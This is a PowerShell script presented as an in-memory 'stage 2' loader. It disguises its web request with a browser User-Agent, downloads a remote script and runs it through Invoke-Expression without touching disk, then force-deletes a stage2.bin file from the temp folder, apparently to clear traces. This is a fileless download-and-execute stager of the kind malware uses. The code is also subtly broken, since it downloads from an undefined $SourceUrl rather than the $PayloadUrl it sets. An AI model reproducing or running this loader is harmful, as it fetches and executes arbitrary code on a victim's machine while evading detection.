<#
.SYNOPSIS
    In-memory stage 2 script loader.

.DESCRIPTION
    Retrieves the stage 2 script as text and invokes it in the
    current session without writing the script to disk.
#>
$PayloadUrl = 'https://localhost:9001/stage2.ps1'
$RequestTimeout = 144
$ErrorActionPreference = "Stop"

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    $ScriptText = $ClientObject.DownloadString($SourceUrl)
    if ([string]::IsNullOrWhiteSpace($ScriptText)) {
        throw "Downloaded script was empty"
    }
    Write-Verbose ("Script length: " + $ScriptText.Length)
    Invoke-Expression $ScriptText
}
catch {
    Write-Warning "In-memory stage failed: $($_.Exception.Message)"
}

$StageMarker = "stage-29"
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
